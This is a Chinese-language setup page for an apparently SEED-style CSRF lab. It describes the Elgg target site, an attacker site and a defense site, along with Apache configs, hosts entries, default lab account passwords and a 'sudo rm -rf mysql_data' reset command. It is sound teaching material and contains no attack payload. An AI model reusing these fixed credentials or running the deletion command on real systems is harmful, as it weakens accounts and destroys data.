<div><strong>额外加分：</strong>尽管这不是强制要求的，我们鼓励学生修改 Elgg 应用程序以利用同源 cookie 机制来防御 CSRF 攻击。建议讲师给予那些成功完成此任务的学生额外加分。学生应该与他们的导师讨论额外得分事宜。</div>

========================================
文件路径: .\跨站请求伪造（CSRF）攻击实验\实验环境\summary.html
========================================

<div>在本实验中，我们将使用三个网站。第一个网站是一个社交网站 www.seed-server.com。第二个网站是攻击者的恶意站点，此网站可通过  www.attacker32.com 访问。第三个网站用于防御任务，其主机名为  www.example32.com。我们使用容器来搭建实验环境。</div>
<div><br>
<div>我们在本实验中使用名为 Elgg 的开源 Web 应用程序。Elgg 是一款基于 Web 的社交网络应用程序。它已在提供的容器映像中设置完毕。我们使用两个容器，一个运行 Web 服务器 (10.9.0.5)，另一个运行 MySQL 数据库 (10.9.0.6)。这两个容器的 IP 地址在配置中已经固定，因此不要在 docker-compose.yml 文件中更改它们。</div>
<br>
<div><strong>Elgg 容器 (10.9.0.5)。</strong>我们使用 Apache Web 服务器托管 Elgg Web 应用程序。网站设置包含在 Elgg 镜像文件夹内的 apache_elgg.conf 中。配置指定网站的 URL 和存储 Web 应用程序代码的文件夹。</div>
<div>
<pre class="language-markup"><code>    &lt;VirtualHost *:80&gt;
         DocumentRoot /var/www/elgg
         ServerName   www.seed-server.com
         &lt;Directory /var/www/elgg&gt;
              Options FollowSymlinks
              AllowOverride All
              Require all granted
         &lt;/Directory&gt;
    &lt;/VirtualHost&gt;</code></pre>
</div>
<br>
<div><strong>攻击者容器（10.9.0.105）。</strong>我们使用另一个容器（10.9.0.105）来运行攻击者的网站，该网站包含一个恶意的 HTML 页面。此页面的 Apache 配置如下：</div>
<pre class="language-markup"><code>    &lt;VirtualHost *:80&gt;
         DocumentRoot /var/www/attacker
         ServerName   www.attacker32.com
    &lt;/VirtualHost&gt;</code></pre>
<div>由于我们需要在容器内创建网页文件，为了方便，我们将主机上的  Labsetup/attacker 文件夹挂载到容器的 /var/www/attacker 文件夹中。因此，在 VM 中放置于 attacker 文件夹内的网页将被攻击者的网站托管，我们已经在该文件夹内放置了代码的框架。</div>
<br>
<div><strong>DNS 配置。</strong>为了通过不同的 URL 访问 Elgg 网站、攻击者站点和防御站点，我们需要在 /etc/hosts 文件中添加以下条目，以便将这些主机名映射到其相应的 IP 地址。您需要使用 root 权限来更改此文件（使用 sudo}）。需要注意的是，由于其他一些实验的原因，这些名称可能已经添加到文件中。如果它们映射到不同的 IP 地址，旧条目必须删除。</div>
<div>
<pre class="language-markup"><code>10.9.0.5        www.seed-server.com
10.9.0.5        www.example32.com
10.9.0.105      www.attacker32.com</code></pre>
<p></p>
<div>
<div><strong>Elgg 用户账号。</strong>我们已在 Elgg 服务器上创建了几个用户账户，用户名和密码如下所示。</div>
<div>
<pre class="language-markup"><code>用户名       登录密码
--------------------------
admin        seedelgg 
alice        seedalice 
boby         seedboby 
charlie      seedcharlie
samy         seedsamy
</code></pre>
<p></p>
<div class=" my-3" data-for="sectioninfo">
<div class="summarytext">
<div class="no-overflow">
<div>
<div>
<div>
<div><strong>MySQL 数据库。</strong>容器通常是一次性的，因此一旦销毁，容器内的所有数据都会丢失。对于本实验，我们确实希望将数据保留在 MySQL 数据库中，这样在关闭容器时就不会丢失数据。为了实现这一点，我们将主机上的 mysql_data 文件夹挂载到 MySQL 容器内的 /var/lib/mysql 文件夹（此文件夹是 MySQL 存储数据库的地方）。因此，即使容器被销毁，数据库中的数据仍会保留。这个 mysql_data 文件夹在 Labsetup 内，它将在 MySQL 容器第一次运行后创建。如果您确实想从空的数据库开始，可以删除此文件夹：</div>
<div>
<pre class="language-markup"><code>$ sudo rm -rf mysql_data</code></pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="section_availability"> </div>
</div>
<div class="divider bulk-hidden d-flex justify-content-center align-items-center always-visible my-3"> </div>
</div>
</div>
</div>
</div>